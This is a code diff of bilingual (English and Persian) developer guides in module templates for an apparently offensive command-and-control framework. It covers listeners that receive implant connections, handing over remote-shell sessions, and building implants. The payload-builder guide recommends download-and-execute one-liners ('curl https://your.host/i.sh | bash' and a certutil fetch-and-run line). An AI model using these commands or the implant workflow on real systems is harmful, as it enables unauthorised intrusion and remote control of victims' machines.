-شل، اسکرین‌شات، آپلود، کلیدها — مجموعه‌ی قابلیت‌ها دقیقاً همان توافقی است که
-تو و پیلود می‌کنید. هسته فقط قفسه (sessions + store) می‌دهد و هرگز میانجی نمی‌شود.
+بخش ۲ — فریم‌ورک داخل run() چه چیزهایی تزریق می‌کند (بدون هیچ تنظیمی)
+  opts              {کلید: مقدار} — مقادیر حل‌شده
+  EIDOLON_GLOBALS   دیکشنری سراسری مشترک
+  EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول (API داخلی — کم و حساب‌شده)
+  __eidolon_path__  مسیر مطلق همین فایل
+  (import های ماژول را کم نگه دار؛ هرچه لازم داری داخل run() بیاور.)
 
-چهار حرکت (کد پایین علامت خورده):
-  1 SERVE    — موتور را روشن کن؛ کلیدهای OPTIONS خودشان پیچ‌وتاب‌اند.
-  2 PROFILE  — انتشار: EIDOLON_SHELL.wraith_listener = <شی با .url/.token/.tags>
-  3 SESSIONS — روی هر اتصال: reg = eidolon.wraith.sessions.default_registry()
-               sess = reg.register(info, addr) · EIDOLON_SHELL._c2_on_event(("up", sess))
-  4 INTERACT — sess.interact = تابع(EIDOLON_SHELL) بده؛ `use <sid>` کنسول را به
-               شلِ خودت تحویل می‌دهد: sh.enter_subshell(on_line=fn, completer=fn,
-               prompt_fn=fn, on_exit=fn) — کامپلیتر = تب‌کامپلیتِ کامل. فریم‌ورک
-               فقط resolve می‌کند و کنار می‌ایستد.
+بخش ۳ — نوشتن لیستنر از صفر: چهار حرکت
+  حرکت ۱ — SERVE
+      موتور را روشن کن. موتور هم‌زمان (سوکت + ریسمان) و موتور async
+      (asyncio) هر دو بومی‌اند؛ نسخه‌ی کامل async پایین آمده.
+      run() بلوک‌شونده تا ابد اینجا درست است: اجرای ماژول لیسنر خودکار
+      به job مدیریت‌شده پس‌زمینه می‌رود و `kill <id>` صدا می‌زند stop().
+      هر پیچی (host/port/tls/فایل توکن …) از OPTIONS می‌آید.
+      TLS کار خود ماژول است: خودت ترمینالش کن (ssl.SSLContext)؛ فریم‌ورک
+      دست به سوکت‌های تو نمی‌زند.
+  حرکت ۲ — PROFILE
+      نقطه‌ی اتصال را منتشر کن تا بیلدرهای پیلود در آرتیفکت جاسازی کنند:
+          EIDOLON_SHELL.wraith_listener = <شی با .url / .token / .tags>
+      .url جایی است که ایمپلنت شماره می‌گیرد (مثلاً tcp://10.4.2.9:51515)،
+      .token ماده‌ی رازِ مشترک توست — قراردادش کاملاً دست آزاد توست و انبار
+      فقط حملش می‌کند (اسکلت پیلود را ببین: بیلدر آن را در آرتیفکت
+      جاسازی می‌کند)، .tags تاپلِ آزاد است مثل ("ws-json-async",) که
+      «فقط همان معنایی را می‌دهد که تو قبول کردی». با port=0 پورت واقعیِ
+      bind را از خود شی سرور بخوان (پایین نشان داده شده) — url پروفایل
+      باید جفت (host:port) واقعی و کامل و شماره‌گرفتنی باشد.
+  حرکت ۳ — SESSIONS (تنها فراخوانی هسته که یک اتصال لازم دارد)
+      بعد از دست‌دادنِ خودت (قالب‌بندی سیمی مالِ توست: hello json/جادویی/هیچ):
+          from eidolon.wraith.sessions import default_registry
+          reg  = default_registry()                 # یا یکی خصوصی
+          sess = reg.register({"sid": شناسه-یکتا,     # لازم — از hello خودت
+                               "implant": "my-implant",
+                               "os": "linux", "arch": "x86_64",
+                               "user": "alice", "host": "corp-ws",
+                               "tags": TAGS}, addr=peer)
+          EIDOLON_SHELL._c2_on_event(("up", sess))   # اعلام فوری در کنسول
+      فریم‌ورک بیش از این کاری نمی‌کند: ثبت، خبر دادن، فهرست (`c2 sessions`).
+      شی سشن دارد: sess.sid/.implant/.os/.arch/.user/.host/.status/.tags.
+  حرکت ۴ — INTERACT (دست به دست شدن با `use <sid>`)
+      sess.interact = تابع(EIDOLON_SHELL) — اپراتور که تایپ کند `use <sid>`
+      کنسول آن را صدا می‌زند و شلِ تو را تحویل می‌گیرد:
+          def _enter(sh, sess, send):
+              sh.enter_subshell(on_line=send,       # خط تایپ‌شده به پیلود
+                                completer=_complete,     # تب‌کامپلیت کامل
+                                prompt_fn=lambda: "%.4s ❯ " % sess.sid,
+                                on_exit=lambda: info("از شل سشن خارج شد"))
+      شل داخلی هیچ‌چیز را نرمال‌لایز نمی‌کند: هر فعل (shell / upload /
+      screenshot / die …) پروتکلِ توست. در موتورهای async خط را با
+      call_soon_threadsafe به حلقه‌ی رویداد تزریق کن (پایین آمده)؛ در
+      موتورهای thread-محور فقط سوکت را در تابع ببند و send() کن.
 
-اعتماد: ماژول تازه UNTRUSTED شروع می‌شود →  trust <name> → use → set → run.
-این اسکفولد فقط با کتابخانه‌های استاندارد سالم اجرا می‌شود (سرور Asyncio TCP
-با شلِ سشن وصل‌شده) — websocket / TLS / هر چیز دیگر را آزادانه جایش بگذار.
+بخش ۴ — جریان اپراتور (صفر تا صد، هر گام کنسولی)
+      new_module mylsn listener ؛ trust mylsn ؛ use mylsn
+      set port 51515 ؛ run              <- خودکار به job می‌رود
+      jobs ؛ c2 sessions                <- لیستنر + سشن‌ها
+      (ایمپلنت شماره می‌گیرد…)          <- «payload connected» از _c2_on_event
+      use <sid>                         <- ساب‌شل خودت، با تب‌کامپلیت
+      back                              <- کنسول؛ کانال زنده می‌ماند
+      kill <id>                         <- stop() سرور را می‌بندد
+  سمت پیلود: `gen <ماژول پیلود>` خوانش EIDOLON_SHELL.wraith_listener
+  (.url/.token/.tags) و جاسازی‌اش در آرتیفکت.
+
+بخش ۵ — قوانین ایمنی/خانه که برای لیستنر هم برقرارند
+  * هر عملیات شبکه timeout صریح دارد؛ گزارش خطا با err(str(e)).
+  * آرتیفکت حاوی کلید واقعی با 0o600 نوشته می‌شود؛ هیچ چیز در tmp نیست.
+  * با اپراتور فقط از eidolon.utils حرف بزن (ok/err/info/warn/spectral).
+  * هرگز eval/exec؛ قالب‌بندی سیمی تو را دفاعی پارس کن (سقف سایز).
+
+بخش ۶ — چک‌لیست پیش از اعلام «تمام»
+  [ ] stop() همه‌ی سوکت/حلقه را می‌بندد — `kill <id>` واقعاً می‌کشد
+  [ ] register() به ازای هر ایمپلنت یک بار، sid یکتا و پایدار
+  [ ] sess.interact سیم‌کشی شده + _c2_on_event روی "up" ("down" هم در خروج)
+  [ ] پروفایل قبل از هر run بیلدر منتشر شده
+  [ ] تب‌کامپلیت داخل `use <sid>` مجموعه‌ی واقعی فعل‌هاست
 """
 
 import asyncio
@@ -563,7 +714,6 @@ RANK        = "normal"      # quality grade: excellent > great > good > normal >
 TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
-REQUIREMENTS = []           # مثال: ["websockets>=11"] — نمایش‌شده، هرگز نصب نمی‌شود
 
 OPTIONS = {
     "host": {"value": "0.0.0.0", "required": False, "desc": "آدرسِ bind"},
@@ -649,38 +799,98 @@ def stop():
     },
     "payload": {
         "en": r'''"""
-__NAME__ — PAYLOAD BUILDER — compiles artifacts for the typed store
+__NAME__ — PAYLOAD BUILDER — the complete zero-to-100 developer guide
+======================================================================
 
-THE CONTRACT (same two names as every module):
-  * OPTIONS    : build-time parameters. The operator sets them with `set`
-                 inside `gen <module>` (GEN MODE) — this one page IS the
-                 payload's configuration; everything typed here travels in
-                 the manifest's "config" field.
-  * run(opts)  : build the artifact in ANY language (go / nim / c / rust /
-                 c# / python / bash / …) and register it:
-                 eidolon.wraith.store.register_payload(name, path, ptype=…,
-                                                       config=<your snapshot>,
-                                                       keep=True)
-                 keep=True keeps the artifact EXACTLY where you wrote it —
-                 the operator's working directory by default (run eidolon
-                 inside ~/HACK/ and the build lands at ~/HACK/implant.sh)
-                 or the explicit `output` option. NEVER temp staging: the
-                 framework REFUSES payloads under /tmp, %TEMP% and friends
-                 (throwaway copies must never be depended on).
-  * stop()     : rarely needed — builders usually return.
+WHAT A BUILDER IS HERE
+  The framework ships ZERO payload sources and ZERO compilers: THIS module
+  is the builder. Produce the implant in ANY language (go / nim / c / rust /
+  c# / bash / python / PowerShell ...) — the entry script is Python, the
+  output is yours. Layout is free (_src/, assets/, ... — resolve from
+  __eidolon_path__).
 
-`set` fills OPTIONS; `run` (in the selection context) reports the
-registration immediately. Exploits then adopt the payload by `set payload
-<name>` — type-validated — or by any raw path they were given. A
-`protocol` tag is OPTIONAL free metadata; no handshake is ever enforced.
+PART 1 — THE CONTRACT (same two names as every module)
+  * OPTIONS  : build-time parameters. The operator sets them with `set`
+               inside `gen <module>` (GEN MODE) — this one page IS the
+               payload's configuration; everything typed here travels in
+               the manifest's "config" field.
+  * run(opts): build the artifact and register it. Plain def; builders
+               normally return fast (put the wildly slow compiles in a
+               thread of your own).
+  * stop()   : rarely needed — builders usually return.
 
-ADVISORY — the classic bash/curl pattern: host the built file anywhere
-(the listener that will receive connects does not have to exist yet) and
-let the exploit's CMD field carry, e.g.:
-  curl https://your.host/implant.sh | bash          (linux)
-  certutil -urlcache -f https://your.host/i.exe %TEMP%\\i.exe && %TEMP%\\i.exe
-The file channels (PAYLOAD_FILE / SHELLCODE_PATH) are just paths the
-operator types — absolute or relative (./payload) — nothing is staged.
+PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run() (zero setup)
+  opts              {KEY: value} — resolved option values
+  EIDOLON_GLOBALS   shared global dict — persist small state
+  EIDOLON_SHELL     the live console instance
+  __eidolon_path__  absolute path of this file (siblings/_src/ from it)
+
+PART 3 — WRITING A BUILDER FROM ZERO (the exact recipe)
+  1. Read the listener profile and REFUSE to build without one — a payload
+     that cannot phone home is garbage:
+         lsn = EIDOLON_SHELL.wraith_listener
+         if not lsn: return err("no listener up — use <listener> · set · run")
+     Embed what you agree on: lsn.url (dial point), lsn.token (shared
+     secret), lsn.tags. Substitution is your choice: string replace, code
+     emission, binpatch — whatever your pipeline likes.
+  2. Read raw sources next to this file via __eidolon_path__ (e.g.
+     _src/implant.go), compile via subprocess — ALWAYS with a timeout:
+         subprocess.run([...], timeout=120, capture_output=True)
+     Non-zero exit / timeout -> err(stderr tail) and stop.
+  3. STORE WHERE THE OPERATOR STANDS — never in temp storage:
+         out = str(opts.get("output", "")).strip()
+         if not out:
+             out = os.path.join(os.getcwd(), name + ".ext")   # operator's cwd
+         out = os.path.abspath(os.path.expanduser(out))
+         if os.path.isdir(out): out = os.path.join(out, name + ".ext")
+     The operator runs eidolon inside /my-file/my-payload/ and the build
+     lands at /my-file/my-payload/implant.exe — or exactly ./ for a
+     relative path. The framework REFUSES payloads under /tmp, /var/tmp,
+     /dev/shm and %TEMP% (both in register_payload and in
+     `set payload <path>`); throwaway copies must never be depended upon.
+     Artifacts holding real key material: write 0o600/0o700.
+  4. REGISTER so exploits can find it:
+         from eidolon.wraith import store
+         manifest = store.register_payload(
+             name, out,
+             ptype="file-posix",           # file-posix | file-win | shellcode | cmd | code
+             backend="sh",                 # free label — who/what executes it
+             target_os=..., arch=...,      # free metadata
+             config={k: v for k, v in opts.items() if k != "store_name"},
+             protocol_tag="",              # OPTIONAL free metadata — display only
+             note="built by __NAME__",
+             keep=True)                    # artifact STAYS at the operator path
+     keep=True is the rule here: the manifest records the ABSOLUTE path
+     where YOU wrote it; the store never copies/moves. store.summary
+     prints a one-liner; store.artifact_path(manifest) is the path
+     exploits read via manifest["path"].
+  5. Match ptype to reality: file-posix for ELF/linux scripts, file-win
+     for PE, shellcode for raw code (size/arch/badchars are now YOUR
+     problem), cmd for one-liners, code for interpreter sources. Exploits
+     restrict their "types" tuple; a mismatched payload is REFUSED at
+     `set payload`, never silently mixed.
+
+PART 4 — THE OPERATOR FLOW (zero to 100, every console step)
+      new_module mybldr payload ; trust mybldr
+      (listener up: use mylsn ; set port ; run)
+      gen mybldr                        -> builder selected (GEN MODE)
+      set store_name acme-implant       -> store name
+      set output                        optional: exact artifact path
+      run                               -> build + register; prints:
+        stored: acme-implant [file-posix] -> store path
+        artifact kept at: /my-file/my-payload/acme-implant.sh
+      c2 payloads                       -> the typed store listing
+      use myexp ; set payload acme-implant ; run
+  Advisory classic pattern (curl|bash): host the built file anywhere (the
+  listener does not need to exist yet) and let the exploit's CMD field
+  carry it, e.g.: curl https://your.host/i.sh | bash
+
+PART 5 — CHECKLIST BEFORE YOU CALL IT DONE
+  [ ] builds refuse (err) when wraith_listener is missing
+  [ ] every subprocess has a timeout; tool failures report stderr
+  [ ] artifact lands in the operator's cwd or the explicit `output`
+  [ ] chmod 0o600/0o700 on artifacts; config snapshot in the manifest
+  [ ] ptype matches the actual artifact
 """
 
 import os
@@ -698,7 +908,6 @@ RANK        = "normal"      # quality grade: excellent > great > good > normal >
 TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
-REQUIREMENTS = []     # compilers you invoke go here — shown by `deps`, never installed
 
 OPTIONS = {
     "store_name":  {"value": "",      "required": False, "desc": "store name (default: this module's NAME)"},
@@ -745,38 +954,96 @@ def run(opts):
     info("exploits adopt it by: set payload %s  (or any raw file path)" % name)
 ''',
         "fa": r'''"""
-__NAME__ — بیلدر پیلود — آرتیفکت‌ها را برای انبارِ تایپ‌دار می‌سازد
+__NAME__ — بیلدر پیلود (PAYLOAD BUILDER) — راهنمای کامل صفر تا صد
+======================================================================
 
-قرارداد (دقیقاً همان دو اسمِ هر ماژول):
-  * OPTIONS    : پارامترهای زمانِ ساخت. اپراتور با `set` داخل `gen <ماژول>`
-                 (حالت GEN) تنظیم‌شان می‌کند — همین یک صفحه خودِ پیکربندیِ
-                 پیلود است؛ هر چه اینجا بنویسد به فیلد "config" مانیفست
-                 می‌رود.
-  * run(opts)  : آرتیفکت را به هر زبانی بساز (go / nim / c / rust / c# /
-                 python / bash / …) و ثبتش کن:
-                 eidolon.wraith.store.register_payload(name, path, ptype=…,
-                                                       config=<اسنپ‌شات خودت>,
-                                                       keep=True)
-                 keep=True یعنی آرتیفکت دقیلاً همانجا می‌ماند که نوشتی —
-                 پیش‌فرض: پوشهِ کاری اپراتور (اگر eidolon داخل ~/HACK/
-                 باشد، بیلد در ~/HACK/implant.sh می‌نشیند) یا مسیر صریح
-                 اپسیون `output`. هرگز مرحله‌بندیِ tmp نیست: فریم‌ورک
-                 پیلودهای زیر /tmp و %TEMP% را رد می‌کند و اکسپلویت
-                 هرگز متکی به کپی‌های دورویزی نیست.
-  * stop()     : معمولاً لازم نیست — بیلدرها برمی‌گردند.
+بیلدر در اینجا یعنی چه
+  فریم‌ورک «هیچ» سورس پیلود و «هیچ» کامپایلری با خودش حمل نمی‌کند: این
+  ماژول همان بیلدر است. ایمپلنت را به «هر زبانی» بساز (go / nim / c / rust /
+  c# / bash / python / PowerShell …) — اسکریپت ورودی پایتون است، خروجی مالِ
+  توست. چیدمان آزاد (_src/، assets/ … — از __eidolon_path__ حل کن).
 
-`set` صفحه را پر می‌کند؛ `run` (در کانتکست انتخاب) بلافاصله گزارشِ ثبت
-می‌دهد. بعدش اکسپلویت پیلود را برمی‌دارد: `set payload <name>` (با
-اعتبارسنجی تایپ) یا هر مسیر خامی که به او ندهند. تگِ `protocol`
-متادیتای اختیاری است؛ هیچ دست‌دادنی اجبار نمی‌شود.
+بخش ۱ — قرارداد (همان دو نامِ هر ماژول)
+  * OPTIONS  : پارامترهای زمانِ ساخت. اپراتور با `set` درون `gen <ماژول>`
+               (حالت GEN) تنظیمشان می‌کند — همین یک صفحه خودش پیکربندیِ
+               پیلود است؛ هر چه اینجا تایپ شود به فیلد "config" مانیفست
+               می‌رود.
+  * run(opts): آرتیفکت را بساز و ثبت کن. def ساده؛ بیلدرها معمولاً سریع
+               برمی‌گردند (کامپایل‌های خیلی سنگین را در thread خودت بگذار).
+  * stop()   : به‌ندرت لازم است — بیلدرها برمی‌گردند.
 
- پیشنهاد — الگوی کلاسیک curl|bash: فایل ساخته‌شده را هر جا آپلود کن
-(لیسنری که قرار است اتصال بگیرد هنوز لازم نیست وجود داشته باشد) و بگذار
-فیلد CMD اکسپلویت حامل باشد، مثلاً:
-  curl https://your.host/implant.sh | bash                    (لینوکس)
-  certutil -urlcache -f https://your.host/i.exe %TEMP%\\i.exe && %TEMP%\\i.exe
-کانال‌های فایلی (PAYLOAD_FILE / SHELLCODE_PATH) فقط مسیرهایی هستند که
-اپراتور تایپ می‌کند — مطلق یا نسبی (./payload) — هیچ مرحله‌بندی‌ای در کار نیست.
+بخش ۲ — فریم‌ورک داخل run() چه چیزهایی تزریق می‌کند (بدون هیچ تنظیمی)
+  opts              {کلید: مقدار} — مقادیر حل‌شده
+  EIDOLON_GLOBALS   دیکشنری سراسری مشترک
+  EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول
+  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها/_src/ از روی آن)
+
+بخش ۳ — نوشتن بیلدر از صفر، گام به گام
+  ۱. پروفایل لیستنر را بخوان و «بدون آن قطعاً رد شو» — پیلودی که نمی‌تواند
+     زنگ بزند آشغال است:
+         lsn = EIDOLON_SHELL.wraith_listener
+         if not lsn: return err("لیستنری بالا نیست — use <لیستنر> · set · run")
+     آنچه توافق می‌کنی را جاسازی کن: lsn.url (نقطه‌ی شماره‌گیری)،
+     lsn.token (راز مشترک)، lsn.tags. شیوه‌ی جایگزینی دست خودت است:
+     جایگزینی رشته، تولید کد، باینری‌پیچ — هر چه پایپ‌لاینِ تو می‌خواهد.
+  ۲. سورس‌های خام را کنار همین فایل بخوان (مثلاً _src/implant.go) و با
+     subprocess کامپایل کن — همیشه با timeout:
+         subprocess.run([...], timeout=120, capture_output=True)
+     خروج غیرصفر یا timeout <- err(دُم stderr) و بس.
+  ۳. دقیقاً همان‌جا که اپراتور ایستاده ذخیره کن — هرگز انبار موقت نه:
+         out = str(opts.get("output", "")).strip()
+         if not out:
+             out = os.path.join(os.getcwd(), name + ".exe")   # پوشه‌ی کاری اپراتور
+         out = os.path.abspath(os.path.expanduser(out))
+         if os.path.isdir(out): out = os.path.join(out, name + ".exe")
+     اپراتور داخل /my-file/my-payload/ برود eidolon را باز کند، ایمپلنت در
+     /my-file/my-payload/implant.exe ساخته می‌شود — و برای مسیر نسبی
+     دقیقاً در ./ . فریم‌ورک پیلودهای زیر /tmp و /var/tmp و /dev/shm و
+     %TEMP% را رد می‌کند (هم در register_payload هم در
+     `set payload <مسیر>`)؛ به کپی‌های دور‌ریز هرگز نباید تکیه شود.
+     آرتیفکت حاوی ماده‌ی راز: با 0o600/0o700 نوشته شود.
+  ۴. ثبت کن تا اکسپلویت‌ها پیدایش کنند:
+         from eidolon.wraith import store
+         manifest = store.register_payload(
+             name, out,
+             ptype="file-posix",           # file-posix | file-win | shellcode | cmd | code
+             backend="sh",                 # برچسب آزاد — چه کسی/چه چیزی اجرایش می‌کند
+             target_os=..., arch=...,      # متادیتای آزاد
+             config={k: v for k, v in opts.items() if k != "store_name"},
+             protocol_tag="",              # متادیتای آزاد اختیاری — فقط نمایش
+             note="built by __NAME__",
+             keep=True)                    # آرتیفکت دقیقاً در مسیر اپراتور می‌ماند
+     keep=True قانونِ اینجاست: مانیفست مسیرِ مطلقی را ثبت می‌کند که «تو»
+     نوشتی؛ انبار هرگز کپی/جابجایی نمی‌کند. store.summary یک خط خلاصه
+     می‌دهد؛ store.artifact_path(manifest) همان مسیری است که اکسپلویت‌ها
+     از manifest["path"] می‌خوانند.
+  ۵. ptype را با واقعیت هم‌تراز کن: file-posix برای ELF/اسکریپت‌های لینوکس،
+     file-win برای PE، shellcode برای کد خام (سایز/معماری/بدکاراکترها حالا
+     مشکل «تو»ست)، cmd برای خط‌فرمان‌ها، code برای سورس‌های مفسرِدار.
+     اکسپلویت‌ها تاپل "types" خودشان را محدود می‌کنند؛ پیلود ناهم‌تایپ در
+     `set payload` رد می‌شود و هرگز بی‌سروصدا میکس نمی‌شود.
+
+بخش ۴ — جریان اپراتور (صفر تا صد، هر گام کنسولی)
+      new_module mybldr payload ؛ trust mybldr
+      (لیستنر روشن: use mylsn ؛ set port ؛ run)
+      gen mybldr                        <- بیلدر انتخاب شد (حالت GEN)
+      set store_name acme-implant       <- نام انبار
+      set output                        اختیاری: مسیر دقیق آرتیفکت
+      run                               <- ساخت + ثبت؛ چاپ می‌شود:
+        stored: acme-implant [file-posix] -> مسیر انبار
+        artifact kept at: /my-file/my-payload/acme-implant.sh
+      c2 payloads                       <- فهرست انبار تایپ‌دار
+      use myexp ؛ set payload acme-implant ؛ run
+  الگوی کلاسیک مشورتی curl|bash: فایل ساخته‌شده را هر جا آپلود کن (لیستنر
+  لازم نیست هنوز وجود داشته باشد) و بگذار فیلد CMD اکسپلویت حامل باشد،
+  مثلاً: curl https://your.host/i.sh | bash
+
+بخش ۵ — چک‌لیست پیش از اعلام «تمام»
+  [ ] بدون wraith_listener با err رد می‌شود
+  [ ] هر subprocess timeout دارد؛ شکست ابزار stderr را گزارش می‌کند
+  [ ] آرتیفکت در پوشه‌ی کاری اپراتور یا output صریح می‌نشیند
+  [ ] chmod 0o600/0o700 روی آرتیفکت؛ snapshot پیکربندی در مانیفست
+  [ ] ptype با آرتیفکت واقعی هم‌خوان است
 """
 
 import os
@@ -794,7 +1061,6 @@ RANK        = "normal"      # quality grade: excellent > great > good > normal >
 TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
-REQUIREMENTS = []     # کامپایلرهایی که صدا می‌زنی اینجا — `deps` نمایش می‌دهد، نصب نمی‌کند
 
 OPTIONS = {
     "store_name":  {"value": "",      "required": False, "desc": "نام در انبار (پیش‌فرض: NAME همین ماژول)"},
@@ -843,42 +1109,60 @@ def run(opts):
     },
     "auxiliary": {
         "en": r'''"""
-__NAME__ — AUXILIARY module — developer field guide
-THE CONTRACT — the framework requires exactly two names:
-  * OPTIONS   : {KEY: {"value": default, "required": bool, "desc": str}}
-                `set KEY value` fills these; required keys are validated
-                automatically BEFORE run() fires. Extra keys: "kind"
-                ("payload" = framework-managed field) and "types".
-  * run(opts) : receives {KEY: value}. Everything else optional.
+__NAME__ — AUXILIARY module — the complete zero-to-100 developer guide
+=======================================================================
 
-INJECTED BY THE FRAMEWORK (inside run, zero setup):
+WHAT AN AUXILIARY IS HERE
+  AUXILIARY = investigation and support. Attacks nothing directly. The
+  whole spectrum is open: port scans, service fingerprints, OSINT, DNS
+  recon, fuzz harnesses, sniffers, brute-force helpers, parsers, report
+  writers — anything that makes the exploit layer smarter.
+
+PART 1 — THE CONTRACT (the framework requires exactly two names)
+  * OPTIONS  : {KEY: {"value": default, "required": bool, "desc": str}}
+               `set KEY value` fills them; required keys validated
+               automatically BEFORE run() fires.
+  * run(opts): receives {KEY: value}; plain def or async def.
+  Optional hooks: on_load() / stop() — like every module.
+
+PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run() (zero setup)
   opts              {KEY: value} — resolved option values
-  EIDOLON_GLOBALS   shared global dict — setg/globals; persist small state
+  EIDOLON_GLOBALS   shared global dict — persist small state
   EIDOLON_SHELL     the live console instance (internal API — sparingly)
   __eidolon_path__  absolute path of this file (resolve siblings from it)
 
-DEPENDENCIES: pip names in REQUIREMENTS — DISPLAYED (`deps`), NEVER installed
-  (supply-chain safety). The operator runs:  pip install <name>
+PART 3 — WRITING AN AUXILIARY FROM ZERO (the exact recipe)
+  1. Decide PASSIVE vs ACTIVE and LET THE OPERATOR CHOOSE: a default-off
+     `active` flag is the house pattern (the scaffold ships one). Passive
+     by default keeps the module safe to run against anything, anytime.
+  2. Declare OPTIONS minimally: target (required), active, output — plus
+     whatever the technique needs (ports, wordlist, depth, threads).
+  3. Implement run(opts):
+       - collect findings into a list (plain values — strings/small dicts);
+       - every packet/request gets an explicit timeout; concurrency is
+         bounded (ThreadPoolExecutor(max_workers=16) or a semaphore);
+       - active probes label themselves in the output (what was sent);
+       - errors: try/except -> err(str(e)) — skip and continue the sweep.
+  4. Results: if `output` is set, write the report there (relative path =
+     operator's cwd — nothing goes to temp storage); else print rows on
+     the console. Machine-readable output (json/csv) beats pretty guessing.
+  5. (optional) Advisory identity: RANK / TARGETS / REFERENCES — displayed
+     by `info`, never enforced.
 
-TRUST (TOFU): fresh modules start UNTRUSTED:
-      trust <name> → use <name> → set KEY value → run
-  First run is recorded; later edits flip it to "modified" until re-trust.
+PART 4 — THE OPERATOR FLOW (zero to 100, every console step)
+      new_module myaux auxiliary ; trust myaux ; use myaux
+      set target 10.4.2.0/24 ; run        -> passive inspection
+      set active true ; run               -> touching probes on
+      set output recon-vpn.json ; run     -> report lands beside the operator
+  Auxiliaries are plain runs: they job out only if `run` blocks (`jobs` /
+  `kill <id>`), exactly like every other module type.
 
-LIFECYCLE HOOKS (optional):
-  on_load()  once at load — cheap + safe only.
-  stop()     long-running modules: clean halt (sockets/loops). `kill <id>`
-             calls it; no stop() = cannot be killed.
-
-HOUSE STYLE:
-  * speak to the operator only via eidolon.utils (ok/err/info/warn/spectral).
-  * network: explicit timeout always; report str(err) through err().
-  * filesystem: whitelists + realpath containment; never eval/exec.
-  * artifacts with real keys are written 0o600.
-
-AUXILIARY = investigation and support. Attacks nothing directly. The whole
-spectrum is open: port scans, service fingerprints, OSINT, DNS recon, fuzz
-harnesses, sniffers, brute-force helpers, parsers, report writers — anything
-that makes the exploit layer smarter.
+PART 5 — CHECKLIST BEFORE YOU CALL IT DONE
+  [ ] passive by default, active opt-in
+  [ ] every probe has an explicit timeout and bounded concurrency
+  [ ] findings are plain values; report path = operator's cwd (never temp)
+  [ ] errors skip a host, they never kill the sweep
+  [ ] output format is documented in the OPTIONS desc lines
 """
 
 from eidolon.utils import ok, err, info, warn, spectral
@@ -895,7 +1179,6 @@ TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
 PAYLOAD_KIND = "none"
-REQUIREMENTS = []
 
 OPTIONS = {
     "target": {"value": "", "required": True,
@@ -932,40 +1215,60 @@ def run(opts):
     ok("__NAME__ finished (scaffold — passive by default)")
 ''',
         "fa": r'''"""
-__NAME__ — AUXILIARY module — developer field guide
-قرارداد — فریم‌ورک فقط دو اسم را لازم دارد:
-  * OPTIONS   : {کلید: {"value": پیش‌فرض, "required": بول, "desc": توضیح}}
-                `set کلید مقدار` این‌ها را پر می‌کند؛ کلیدهای required پیش از
-                run() خودکار اعتبارسنجی می‌شوند. کلیدهای اضافی: "kind"
-                ("payload" = فیلد اختصاصیِ مدیریت‌شده) و "types".
-  * run(opts) : مقدار {کلید: مقدار} می‌گیرد؛ بقیه اختیاری.
+__NAME__ — ماژول AUXILIARY — راهنمای کامل صفر تا صد توسعه‌دهنده
+=======================================================================
 
-توسط فریم‌ورک تزریق می‌شود (داخل run، بدون تنظیم):
-  opts              {کلید: مقدار} — مقادیر گزینه‌ها
-  EIDOLON_GLOBALS   دیکشنری سراسری مشترک — setg/globals
+auxiliary در اینجا یعنی چه
+  AUXILIARY = پژوهش و پشتیبانی. مستقیماً به هیچ چیزی حمله نمی‌کند. کل طیف
+  باز است: اسکن پورت، انگشت‌نگاری سرویس، ‏OSINT، ‏recon دامنه، هارنسِ fuzz،
+  اسنیفر، مددِ brute-force، پارسر، گزارش‌نویس — هر چیزی که لایه‌ی
+  اکسپلویت را باهوش‌تر کند.
+
+بخش ۱ — قرارداد (فریم‌ورک فقط دو نام لازم دارد)
+  * OPTIONS  : {کلیدی: {"value": پیشفرض, "required": بول, "desc": توضیح}}
+               با `set کلید مقدار` پر می‌شوند؛ کلیدهای required قبل از
+               اجرای run() خودکار کنترل می‌شوند.
+  * run(opts): {کلیدی: مقدار} می‌گیرد؛ def ساده یا async def.
+  قلاب‌های اختیاری: on_load() / stop() — مثل همه‌ی ماژول‌ها.
+
+بخش ۲ — فریم‌ورک داخل run() چه چیزهایی تزریق می‌کند (بدون هیچ تنظیمی)
+  opts              {کلید: مقدار} — مقادیر حل‌شده‌ی گزینه‌ها
+  EIDOLON_GLOBALS   دیکشنری سراسری مشترک — نگهداری حالت کوچک
   EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول (API داخلی — کم و حساب‌شده)
-  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از این حل کن)
+  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از روی آن حل کن)
 
-وابستگی‌ها: اسم‌های pip در REQUIREMENTS — فقط «نمایش» (`deps`)، هرگز نصب
-  خودکار (امنیت زنجیره‌ی تأمین). اپراتور خودش:  pip install <name>
+بخش ۳ — نوشتن auxiliary از صفر، گام به گام
+  ۱. تصمیم بگیر «منفعل» یا «فعال» و انتخاب را به اپراتور بده: الگوی خانه
+     فلگ `active` است که پیش‌فرض خاموش است (این اسکلت هم آن را دارد).
+     پیش‌فرضِ منفعل ماژول را امن می‌کند که هر لحظه روی هر چیزی اجرا شود.
+  ۲. OPTIONS حداقلی: target (لازم)، active، output — به‌علاوه‌ی هر چه
+     تکنیکت لازم دارد (پورت‌ها، ووردلیست، عمق، تعداد ریسمان).
+  ۳. پیاده‌سازی run(opts):
+       - یافته‌ها را در یک لیست جمع کن (مقدار ساده — رشته/دیک کوچک)؛
+       - هر بسته/درخواست timeout صریح دارد؛ هم‌زمانی محدود است
+         (ThreadPoolExecutor(max_workers=16) یا سیمافور)؛
+       - پراب‌های فعال خودشان را در خروجی معرفی می‌کنند (چه فرستاده شد)؛
+       - خطا: try/except <- err(str(e)) — یک میزبان را رد کن، جارو ادامه.
+  ۴. خروجی: اگر `output` ست شود گزارش همان‌جا نوشته می‌شود (مسیر نسبی =
